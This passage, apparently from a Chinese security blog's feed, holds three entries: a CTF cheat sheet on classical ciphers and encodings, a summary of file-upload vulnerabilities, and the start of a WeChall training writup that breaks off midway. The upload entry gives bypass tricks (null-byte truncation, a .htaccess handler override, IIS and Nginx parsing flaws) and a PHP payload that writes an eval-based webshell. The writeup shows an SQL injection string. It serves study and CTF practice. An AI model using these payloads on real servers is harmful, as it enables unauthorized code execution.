href="(![]+[]">+[[+!+[]]]]</a>[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])()</p>
</blockquote>
<p>其他一些基本的表达：</p>
<pre><code>false       =&gt;  ![]
true        =&gt;  !![]
undefined   =&gt;  [][[]]
NaN         =&gt;  +[![]]
0           =&gt;  +[]
1           =&gt;  +!+[]
2           =&gt;  !+[]+!+[]
10          =&gt;  [+!+[]]+[+[]]
Array       =&gt;  []
Number      =&gt;  +[]
String      =&gt;  []+[]
Boolean     =&gt;  ![]
Function    =&gt;  [][&quot;filter&quot;]
eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()
window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()
</code></pre><p>可以使用firebug直接解密.</p>
<h3 id="JsFuck在线解密"><a href="#JsFuck在线解密" class="headerlink" title="JsFuck在线解密"></a><a href="http://www.jsfuck.com/" target="_blank" rel="external">JsFuck在线解密</a></h3><h1 id="0x06-栅栏密码"><a href="#0x06-栅栏密码" class="headerlink" title="0x06 栅栏密码"></a>0x06 栅栏密码</h1><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
<h2 id="例如-2"><a href="#例如-2" class="headerlink" title="例如"></a>例如</h2><pre><code>明文：THERE IS A CIPHER
去掉空格后变为：THEREISACIPHER
两个一组，得到：TH ER EI SA CI PH ER
先取出第一个字母：TEESCPE
再取出第二个字母：HRIAIHR
连在一起就是：TEESCPEHRIAIHR
还原为所需密码。
而解密的时候，我们先把密文从中间分开，变为两行：
T E E S C P E
H R I A I H R
再按上下上下的顺序组合起来：
THEREISACIPHER
分出空格，就可以得到原文了：
THERE IS A CIPHER

例如密文：NlEyQd{seft}
N l 
E y 
Q d 
{ s 
e f
 t }
NEQ{etIydsf}
</code></pre><p>python实现栅栏解密：<a href="http://oa8y5guqs.bkt.clouddn.com/zhalan.py" target="_blank" rel="external">zhalan.py</a></p>
<h1 id="0x07-凯撒密码"><a href="#0x07-凯撒密码" class="headerlink" title="0x07 凯撒密码"></a>0x07 凯撒密码</h1><p>它的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。</p>
<p>##例如</p>
<blockquote>
<p>当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。</p>
</blockquote>
<p>解密参照凯撒密码表：<br><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A1%A8.png" alt=""></p>
<pre><code>上述的密文：NEQ{etIydsf}
发现移位11
CTF{tianshu}
</code></pre><p>python实现凯撒解密：<a href="http://oa8y5guqs.bkt.clouddn.com/kaisa.py" target="_blank" rel="external">kaisa.py</a></p>
<h1 id="0x08-维吉利亚密码"><a href="#0x08-维吉利亚密码" class="headerlink" title="0x08 维吉利亚密码"></a>0x08 维吉利亚密码</h1><p>恺撒密码的基础上扩展的多表密码.</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><pre><code>如果你要对自己的男（女）神用维密（不是维多利亚的秘密）表白，先写好明文：I LOVE YOU
然后自己设定一个密钥，比如：KISS。
这样密钥与明文对应就是
K ISSK ISS
I LOVE YOU

对第一个字母“I”加密过程如下：
先找到最左侧密钥K所在的一行和最上方明文I所在列，找到他们的相交字母S，这样I就被加密成了S。
同理，这句话通过每一个对应密钥的加密后就变成如下
密钥：KISSKISS
明文：ILOVEYOU
密文：STGNOGGM
</code></pre><p>维吉利亚密码表：</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E7%BB%B4%E5%90%89%E5%88%A9%E4%BA%9A%E5%AF%86%E7%A0%81%E8%A1%A8.png.jpg" alt=""></p>
<p><a href="http://oa8y5guqs.bkt.clouddn.com/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7.zip" target="_blank" rel="external">维吉利亚加解密工具</a></p>
<h1 id="0x09-Unicode编码"><a href="#0x09-Unicode编码" class="headerlink" title="0x09 Unicode编码"></a>0x09 Unicode编码</h1><p>Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准,包括字符集、编码方案等。目前常用的有UTF-8、UTF-16、UTF-32。</p>
<h3 id="密文形式："><a href="#密文形式：" class="headerlink" title="密文形式："></a>密文形式：</h3><blockquote>
<p>\u5927\u5bb6\u597d\uff01\u000d\u000a</p>
</blockquote>
<p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="external">Unicode在线解密</a></p>
<h1 id="0x10-brainfuck编码"><a href="#0x10-brainfuck编码" class="headerlink" title="0x10 brainfuck编码"></a>0x10 brainfuck编码</h1><p>Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf<em>ck或brainf*</em>k，甚至被简称为BF。<br>共有八个字符</p>
<pre><code>字符含义：
&gt;    指针加一
&lt;    指针减一
+    指针指向的字节的值加一
-    指针指向的字节的值减一
.    输出指针指向的单元内容（ASCⅡ码）
,    输入内容到指针指向的单元（ASCⅡ码）
[    如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处
]    如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处
</code></pre><h3 id="密文形式"><a href="#密文形式" class="headerlink" title="密文形式:"></a>密文形式:</h3><pre><code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]
&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.
&gt;.+++.------.--------.&gt;+.&gt;.
</code></pre><h3 id="解密方法"><a href="#解密方法" class="headerlink" title="解密方法"></a>解密方法</h3><ul>
<li><p>使用brainfuck解释器解密</p>
<p>  bftools.exe Decode braincopter doge.jpg -o dogeout.png</p>
<p>  bftools.exe run dogeout.png</p>
<p>  Q1RGe0JyYWluZnVja18xc19TaW1wMWV9</p>
<p>  CTF{Brainfuck_1s_Simp1e}</p>
</li>
<li><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="external">brainfuck在线解密</a></li>
</ul>
<h1 id="0x11-Playfair编码"><a href="#0x11-Playfair编码" class="headerlink" title="0x11 Playfair编码"></a>0x11 Playfair编码</h1><p>Playfair密码出现于1854年，它依据一个5*5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待。英语中z使用最少，可以去掉它。</p>
<h3 id="加密描述："><a href="#加密描述：" class="headerlink" title="加密描述："></a>加密描述：</h3><pre><code>第一步是编制密码表。在这个5*5的密码表中，共有5行5列字母。
第一列（或第一行）是密钥,其余按照字母顺序。密钥是一个单词或词组，若有重复字母，可将后面重复的字母去掉。当然也要把使用频率最少的字母去掉。
如：密钥是Live and learn,去掉后则为liveandr。如果密钥过长可占用第二列或行
</code></pre><h3 id="例如-3"><a href="#例如-3" class="headerlink" title="例如"></a>例如</h3><pre><code>首先playfair的加密过程用到一个5x5的字母矩阵,容纳26个字母，其中i和j挤到一个格子里，字母填写顺序取
决于密钥，The quick brown fox jumps over the lazy dog!既然出题者不是在讲故事，那，这句就是密钥了吧
将空格去掉，然后填入矩阵里，重复出现的字母只填一次。

填完后如下表：
t   h   e   q   u
i/j  c   k   b   r
o   w   n   f   x
m   p   s   v   l
a   z   y   d   g
填完密钥出现的字母后，若还有空余，就填字母表中剩余的字母（按字母表顺序）
</code></pre><h3 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a>加密过程：</h3><pre><code>把明文按两个字母一组分组，比如hello就分成he,lx,lo
相邻字母相同的情况下，中间加个填充字母x(有时候是q)，若最后一个字母没组员，也加个填充字母。
加密规则：
1、两明文字母m1,m2同行，密文字母c1,c2在它们右边，同行循环，比如hu加密后是et；
2、m1,m2同列：c1,c2在它们下边，同列循环，hz加密后是ch；
3、m1,m2不同行列：c1,c2是m1,m2 组成的长方形的另两个顶点，顺序是c1与m1同行，c2与m2同行，cd加密后是bz；
</code></pre><h3 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h3><pre><code>有了密钥矩阵，将加密过程反过来就行。ihxo解密就是ctfx
 ihxo{smzdodcikmodcismzd}
ctfx{playfairisfairplay}
</code></pre><h1 id="0x12-urlcode编码"><a href="#0x12-urlcode编码" class="headerlink" title="0x12 urlcode编码"></a>0x12 urlcode编码</h1><p>UrlEncode：将字符串以URL编码</p>
<p>返回值：字符串</p>
<p>函数种类：编码处理</p>
<h3 id="形式：-1"><a href="#形式：-1" class="headerlink" title="形式："></a>形式：</h3><pre><code>%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d
</code></pre><h3 id="urlcode在线解密"><a href="#urlcode在线解密" class="headerlink" title="urlcode在线解密"></a><a href="http://tool.chinaz.com/Tools/URLEncode.aspx" target="_blank" rel="external">urlcode在线解密</a></h3><h1 id="0x13-Serpent编码"><a href="#0x13-Serpent编码" class="headerlink" title="0x13 Serpent编码"></a>0x13 Serpent编码</h1><p>Serpent（蟒蛇）,它是AES的一个候选算法,该算法使用256位的密钥对128位的决数据进行加解密;<br>描述了Serpent的加解密过程及子密钥生成过程,同时对其性能作了部分阐述</p>
<h3 id="Serpent在线解密"><a href="#Serpent在线解密" class="headerlink" title="Serpent在线解密"></a><a href="http://tool.chacuo.net/cryptserpent" target="_blank" rel="external">Serpent在线解密</a></h3><h1 id="0x14-异或加密"><a href="#0x14-异或加密" class="headerlink" title="0x14 异或加密"></a>0x14 异或加密</h1><pre><code>异或的运算方法是一个二进制运算：
1^1=0
0^0=0
1^0=1
0^1=1

两者相等为0,不等为1.
</code></pre><h3 id="形式：-2"><a href="#形式：-2" class="headerlink" title="形式："></a>形式：</h3><blockquote>
<p>一般为一个二进制字符串和一个英文字母</p>
<h3 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h3><ul>
<li>先把密钥转化成二进制</li>
<li>再和密文异或</li>
</ul>
</blockquote>
<p>异或解密算法：<a href="http://oa8y5guqs.bkt.clouddn.com/yihuo.py" target="_blank" rel="external">yihuo.py</a></p>
<h1 id="0x15-CRC32加密"><a href="#0x15-CRC32加密" class="headerlink" title="0x15 CRC32加密"></a>0x15 CRC32加密</h1><p>CRC校验实用程序库 在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。<br>CRC是网络传输中经常用的一种校验方式。<br>其中CRC32则是采用这样的一个多项式生成式的CRC：<br>Xe32+Xe26+Xe23+Xe22+Xe16+Xe12+Xe11+Xe10 +Xe8+Xe7+Xe5+Xe4+Xe2+X+1<br>( string$str )<br>生成str的 32 位循环冗余校验码多项式。这通常用于检查传输的数据是否完整。</p>
<p><a href="http://blog.sina.com.cn/s/blog_64d75a250100i2qx.html" target="_blank" rel="external">python计算CRC32</a></p>
<h1 id="0x16-邮件编码"><a href="#0x16-邮件编码" class="headerlink" title="0x16 邮件编码"></a>0x16 邮件编码</h1><p>邮件编码即uuencode编码，是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件</p>
<h3 id="形式：-3"><a href="#形式：-3" class="headerlink" title="形式："></a>形式：</h3><pre><code>MR,O)^KNYU&gt;;*Q[*[P_?#Q+&quot;AHZS6Q\G,LKNYNZ.LR;;2LK*[N^&amp;CK+/VN/;,

MXK:\TJJ]RKZAQ-36K:&amp;CH:,*M/.XQ;3PL+B^S&lt;K&apos;U&gt;+1^;#)=V-T9GMU=75U

*=65N8V]D95]??0``
</code></pre><p><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="external">Uuencode在线解密</a></p>
<h1 id="0x17-曼切斯特编码"><a href="#0x17-曼切斯特编码" class="headerlink" title="0x17 曼切斯特编码"></a>0x17 曼切斯特编码</h1><p>曼彻斯特编码（Manchester Encoding），也叫做相位编码（ Phase Encode，简写PE），是一个同步时钟编码技术，被物理层使用来编码一个同步位流的时钟和数据。</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E6%9B%BC%E5%88%87%E6%96%AF%E7%89%B9%E7%BC%96%E7%A0%81.jpg" alt=""></p>
<pre><code>从低到高跳变表示&quot;0&quot;，从高到低跳变表示&quot;1&quot;。
还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示&quot;0&quot;或&quot;1&quot;，有跳变为&quot;0&quot;，无跳变为&quot;1&quot;。
即:
0-1    跳变表示 1,1-0 跳变表示 0
然而一般来说无线调制中，传感器和 RF 前端之前通信一般会采用 SPI 接口，而 SPI 接口有两种模式， MSB First 和 LSB First，一般在大多数情况下，都是 MSB First，可是这题不是，有点奇葩，这题是 LSB First
</code></pre><h1 id="0x18-其他加密"><a href="#0x18-其他加密" class="headerlink" title="0x18 其他加密"></a>0x18 其他加密</h1><p><a href="http://baike.baidu.com/link?url=R6oWhCdKvzlG8hB4hdIdUT1cZPbFOCrpU6lJAkTtdiKodD7eRTbASpd_YVfi4LMl7N8yFyhVNOz5ki6TC7_5eq" target="_blank" rel="external">希尔密码</a></p>
<p><a href="http://baike.baidu.com/view/10613.htm?fromtitle=RSA&amp;fromid=210678&amp;type=syn" target="_blank" rel="external">Ras加密</a></p>
<p><a href="http://rot13.de/" target="_blank" rel="external">Rot13加密</a></p>
<p><a href="http://baike.baidu.com/link?url=yN39kWG2pGd9XHo3RjeUAbd7xs0QlnJ2uHzCJfxC03V-fJcQUdfcJ-WuGoAkKGFVE0AxFK4-98wa4FtzvxRA0_" target="_blank" rel="external">猪圈密码</a></p>
<p><a href="http://tieba.baidu.com/p/2027781907" target="_blank" rel="external">当铺密码</a></p>
<p><a href="http://tieba.baidu.com/p/2027781907" target="_blank" rel="external">手机电脑键盘密码</a></p>
<p><a href="http://tool.chinaz.com/Tools/Escape.aspx" target="_blank" rel="external">Escape加密</a></p>
<h3 id="混淆加密"><a href="#混淆加密" class="headerlink" title="混淆加密"></a>混淆加密</h3><p><a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">Asp混淆加密</a></p>
<p><a href="http://www.zhaoyuanma.com/phpcodefix.html" target="_blank" rel="external">Php混淆加密</a></p>
<p><a href="http://tool.css-js.com/" target="_blank" rel="external">Css/js混淆加密</a></p>
<p><a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">VBScript.Encode混淆加密:</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 加密解密 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上传漏洞总结]]></title>
      <url>/2016/05/11/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，有时候几乎没有什么技术门槛。<br><a id="more"></a></p>
<h1 id="0x01-上传检测机制"><a href="#0x01-上传检测机制" class="headerlink" title="0x01 上传检测机制"></a>0x01 上传检测机制</h1><h3 id="0x01-1-客户端javascript检测"><a href="#0x01-1-客户端javascript检测" class="headerlink" title="0x01_1 客户端javascript检测"></a>0x01_1 客户端javascript检测</h3><p>通常检测的是文件的扩展名</p>
<h3 id="0x01-2-服务端MIME类型检测"><a href="#0x01-2-服务端MIME类型检测" class="headerlink" title="0x01_2 服务端MIME类型检测"></a>0x01_2 服务端MIME类型检测</h3><p>通常检测的是Content-Type内容</p>
<h3 id="0x01-3-服务端目录路径检测"><a href="#0x01-3-服务端目录路径检测" class="headerlink" title="0x01_3 服务端目录路径检测"></a>0x01_3 服务端目录路径检测</h3><p>通常跟path参数相关的内容</p>
<h3 id="0x01-4-服务端文件扩展名检测"><a href="#0x01-4-服务端文件扩展名检测" class="headerlink" title="0x01_4 服务端文件扩展名检测"></a>0x01_4 服务端文件扩展名检测</h3><p>通常检测跟文件extension相关的内容</p>
<h3 id="0x01-5-服务端文件内容检测"><a href="#0x01-5-服务端文件内容检测" class="headerlink" title="0x01_5 服务端文件内容检测"></a>0x01_5 服务端文件内容检测</h3><p>检测文件内容是否合法或含有恶意代码</p>
<h1 id="0x02-文件上传漏洞利用"><a href="#0x02-文件上传漏洞利用" class="headerlink" title="0x02 文件上传漏洞利用"></a>0x02 文件上传漏洞利用</h1><h3 id="0x02-1-javascript客户端验证"><a href="#0x02-1-javascript客户端验证" class="headerlink" title="0x02_1 javascript客户端验证"></a>0x02_1 javascript客户端验证</h3><p>创建一个允许的文件类型，里面写入我们需要的代码，抓包，拦截，修改为可执行的恶意代码。</p>
<h3 id="0x02-2-MIME类型验证"><a href="#0x02-2-MIME类型验证" class="headerlink" title="0x02_2 MIME类型验证"></a>0x02_2 MIME类型验证</h3><p>直接修改Content-Type：允许的MIME类型</p>
<p>修改文件名为可执行文件，有时候需要配合修改<code>multipart/form-data</code>的大小写</p>
<p>常见的MIME类型：</p>
<pre><code>超文本标记语言文本 .html text/html 　　
xml文档 .xml text/xml
普通文本 .txt text/plain 　　
RTF文本 .rtf application/rtf 　　
PDF文档 .pdf application/pdf 　　
Microsoft Word文件 .word application/msword 　　
PNG图像 .png image/png 　　
GIF图形 .gif image/gif 　　
JPEG图形 .jpeg,.jpg image/jpeg 　　
au声音文件 .au audio/basic 　　
MIDI音乐文件 mid,.midi audio/midi,audio/x-midi 　　
RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio 　　
MPEG文件 .mpg,.mpeg video/mpeg 　　
AVI文件 .avi video/x-msvideo 　　
GZIP文件 .gz application/x-gzip 　　
TAR文件 .tar application/x-tar 　　
任意的二进制数据 application/octet-stream
</code></pre><h3 id="0x02-3-目录路利用"><a href="#0x02-3-目录路利用" class="headerlink" title="0x02_3 目录路利用"></a>0x02_3 目录路利用</h3><p>解析是从前往后解析，判断是从后往前判断。</p>
<p>零零截断一般步骤为：</p>
<pre><code>1.新建一个名为test.php%00.jpg或者test.php.jpg

2.在里面写入一句话木马（[如何在图片中插入一句话](http://wenku.baidu.com/link?url=GoR21a2WWH2C8c8Q7HIgrz7CoW3B4suAwDaaRkAt6vgCZyYr7Le7Z9ZeiurBIE7NHuNwJ7dro5lCql8mRlk3y2IS7iFbWuQM99HV_kXDvTm)）

3.burp抓包改%00或者.为url编码
</code></pre><p>iis按照路径解析的是：</p>
<p>比如我们上传一个名为123.asp/123.jpg文件</p>
<p>则，123.asp/123.jpg会被直接解析成123.asp</p>
<h3 id="0x02-4-文件扩展名利用"><a href="#0x02-4-文件扩展名利用" class="headerlink" title="0x02_4 文件扩展名利用"></a>0x02_4 文件扩展名利用</h3><h4 id="黑名单检测"><a href="#黑名单检测" class="headerlink" title="黑名单检测"></a>黑名单检测</h4><ul>
<li><p>文件大小写绕过</p>
<blockquote>
<p>比如像Asp，Php之类的文件名绕过黑名单检测</p>
</blockquote>
</li>
<li><p>名单列表绕过</p>
<blockquote>
<p>利用黑名单里没有的名单进行攻击，比如黑名单里没有asa，cer，php3，php5之类的</p>
</blockquote>
</li>
<li><p>特殊文件名绕过</p>
<blockquote>
<p>修改文件名为test.asp.或者test.asp_（下划线为空格），绕过验证之后，windows会自动去掉点和空格，linux和unix下不支持</p>
</blockquote>
</li>
<li><p>0x00截断绕过</p>
</li>
<li><p>双扩展名绕过</p>
<blockquote>
<p>apache解析式从后往前，所以如果上传一个test.php.123,不认识.123的文件，所以会往前解析，直到遇到能解析的</p>
</blockquote>
</li>
<li><p>.htaccess文件攻击</p>
<blockquote>
<p>配合名单列表绕过，上传一个自定义的.htaccess文件，就可以轻松绕过各种检测</p>
</blockquote>
<p>  新建一个.htaccess文件<br>  代码为：<br>  <filesmatch "test"=""><br>  SetHandler application/x-httpd-php<br>  </filesmatch><br>  然后上传一个包含test字符串的文件，没有扩展名<br>  里面写入一句话即可</p>
</li>
</ul>
<h4 id="白名单检测"><a href="#白名单检测" class="headerlink" title="白名单检测"></a>白名单检测</h4><ul>
<li><p>%00截断</p>
</li>
<li><p>解析调用/漏洞绕过</p>
<blockquote>
<p>配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞</p>
</blockquote>
</li>
<li><p>.htaccess文件</p>
<h1 id="0x02-5-文件内容检测绕过"><a href="#0x02-5-文件内容检测绕过" class="headerlink" title="0x02_5 文件内容检测绕过"></a>0x02_5 文件内容检测绕过</h1></li>
<li><p>文件头检测</p>
<pre><code>jpg-JFIF-FF D8 FF EO 00 10 4A 46 49 46
gif-GIF89a-47 49 46 38 39 61
png-PNG-89 50 4E 47
在文件头后面加上恶意代码就行了
</code></pre></li>
<li>文件相关信息检测</li>
<li>文件加载检测<blockquote>
<p>在文件注释处插入恶意代码</p>
</blockquote>
</li>
</ul>
<h1 id="0x02-6-解析漏洞利用"><a href="#0x02-6-解析漏洞利用" class="headerlink" title="0x02_6 解析漏洞利用"></a>0x02_6 解析漏洞利用</h1><h4 id="Apache的扩展名顺序解析漏洞"><a href="#Apache的扩展名顺序解析漏洞" class="headerlink" title="Apache的扩展名顺序解析漏洞"></a>Apache的扩展名顺序解析漏洞</h4><p>命名为test.php.xxx（集成环境里php3都会按照php来解析）</p>
<h4 id="IIS的asp解析漏洞"><a href="#IIS的asp解析漏洞" class="headerlink" title="IIS的asp解析漏洞"></a>IIS的asp解析漏洞</h4><ul>
<li><p>IIS6.0</p>
<pre><code>1.命名为test.asp;.jpg
2.命名为test.asp/123.jpg(test.asp是一个目录)
3.命名为test.asa,test.cer.test.cdx
</code></pre></li>
<li><p>IIS7.5/7.0</p>
<pre><code>在默认Fast-CGI开启状况下,上传一个名字为test.jpg，内容为
&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;
的文件，然后访问test.jpg/.php,在这个目录下就会生成一句话木马 shell.php
</code></pre><h4 id="Nginx的-00解析漏洞"><a href="#Nginx的-00解析漏洞" class="headerlink" title="Nginx的%00解析漏洞"></a>Nginx的%00解析漏洞</h4><p>  命名为test.jpg%00.php</p>
<h4 id="php-cgi的默认配置漏洞"><a href="#php-cgi的默认配置漏洞" class="headerlink" title="php-cgi的默认配置漏洞"></a>php-cgi的默认配置漏洞</h4></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WeChall writeup]]></title>
      <url>/2016/03/04/WeChall_writeup/</url>
      <content type="html"><![CDATA[<p>WeChall Challage writeup.</p>
<h1 id="Training：Get-Sourced"><a href="#Training：Get-Sourced" class="headerlink" title="Training：Get Sourced"></a>Training：Get Sourced</h1><a id="more"></a>
<p>查看源码</p>
<p>最后面：<br>                                                                                                                                                                                                                                          <code>&lt;!-- You are looking for this password: html_sourcecode --&gt;</code></p>
<h1 id="Training-Stegano-I"><a href="#Training-Stegano-I" class="headerlink" title="Training: Stegano I"></a>Training: Stegano I</h1><p>隐写</p>
<p>下载下来，使用notepad打开</p>
<blockquote>
<p>Look what the hex-edit revealed: passwd:steganoI</p>
</blockquote>
<h1 id="Training-ASCII"><a href="#Training-ASCII" class="headerlink" title="Training: ASCII"></a>Training: ASCII</h1><pre><code>84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 108, 101, 110, 112, 108, 99, 102, 104, 104, 105, 115, 102
</code></pre><p>ASCII解码</p>
<blockquote>
<p>The solution is: lenplcfhhisf</p>
</blockquote>
<h1 id="Training-Crypto-Caesar-I"><a href="#Training-Crypto-Caesar-I" class="headerlink" title="Training: Crypto - Caesar I"></a>Training: Crypto - Caesar I</h1><pre><code>VJG SWKEM DTQYP HQZ LWORU QXGT VJG NCBA FQI QH ECGUCT CPF AQWT WPKSWG UQNWVKQP KU DHFUHKPPTRCF
</code></pre><p>凯撒解密，偏移24</p>
<pre><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG OF CAESAR AND YOUR UNIQUE SOLUTION IS BFDSFINNRPAD
</code></pre><h1 id="Encodings-URL"><a href="#Encodings-URL" class="headerlink" title="Encodings: URL"></a>Encodings: URL</h1><pre><code>%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%6D%61%69%68%68%6D%6F%62%68%69%6E%70%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21 
</code></pre><p>URL编码，URL解码</p>
<pre><code>Yippeh! Your URL is challenge/training/encodings/url/saw_lotion.php?p=maihhmobhinp&amp;cid=52#password=fibre_optics Very well done! 
</code></pre><h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training: WWW-Robots"></a>Training: WWW-Robots</h1><p>考察<strong>robots.txt</strong>（网络爬虫协议）</p>
<pre><code>http://www.wechall.net/robots.txt
User-agent: *
Disallow: /challenge/training/www/robots/T0PS3CR3T
</code></pre><h1 id="Prime-Factory"><a href="#Prime-Factory" class="headerlink" title="Prime Factory"></a>Prime Factory</h1><p>找到第一个和第二个大于1百万，并且每个位上的数字的和都是素数的素数。</p>
<p>代码如下：</p>
<pre><code>def iszhishu(n):
    for i in range(2,n):
        if n % i ==0:
            return False
    return True
def sum(n):
    count = 0
    for t in range(len(n)):
        count += int(n[t])
    if iszhishu(count):
        return True
    else:
        return False
for num in range(1000001,9999999):
    if iszhishu(num):
        if sum(str(num)):
            print(int(num))
</code></pre><p>取前两个</p>
<blockquote>
<p>1000033 1000037</p>
</blockquote>
<h1 id="PHP-0817"><a href="#PHP-0817" class="headerlink" title="PHP 0817"></a>PHP 0817</h1><p>本地文件包含，代码如下：</p>
<pre><code>&lt;?php
if (isset($_GET[&apos;which&apos;]))
{
        $which = $_GET[&apos;which&apos;];
        switch ($which)        
        {
        case 0:
        case 1:
        case 2:
                require_once $which.&apos;.php&apos;;                
                break;
        default:
                echo GWF_HTML::error(&apos;PHP-0817&apos;, &apos;Hacker NoNoNo!&apos;, false);
                break;
        }
}
</code></pre><p>要求是包含solution.php.</p>
<blockquote>
<p><a href="http://www.wechall.net/challenge/php0817/index.php?which=solution" target="_blank" rel="external">http://www.wechall.net/challenge/php0817/index.php?which=solution</a></p>
</blockquote>
<h1 id="Training-MySQL-I"><a href="#Training-MySQL-I" class="headerlink" title="Training: MySQL I"></a>Training: MySQL I</h1><p>简单的sql注入</p>
<p>万能密钥：</p>
<blockquote>
<p>admin’or’1’=’1</p>
</blockquote>
<h1 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h1><p>就是一个简单的post数据包。</p>
<p>就是先获取生成随机数那个页面的 http 头。然后把自己的 Cookie 加上去。</p>
<p>然后请求这个页面，得到字符串，将其拼接在提交页面的 url 上。</p>
<p>再请求提交页面的 http 头，并添加自己的 Cookie，最后请求即可。</p>
<p>Warning:</p>
<p>这个网站在国外，但是打开一个页面就要 1 秒多。所以国内跑这个脚本肯定超时。这时候你就需要一台国外服务器来跑这个脚本。</p>
<h1 id="Training-PHP-LFI"><a href="#Training-PHP-LFI" class="headerlink" title="Training: PHP LFI"></a>Training: PHP LFI</h1><p><strong>本地文件包含+零零截断</strong>。</p>
<p>源码如下：</p>
<pre><code>$filename = &apos;pages/&apos;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).&apos;.html&apos;;
include $filename;
</code></pre><p>会在file的前面加上<code>pages/</code>后面加上<code>welcome</code></p>
<p>所以结果就是：<code>pages/file.html</code></p>
<p>所以构造如下代码：</p>
<blockquote>
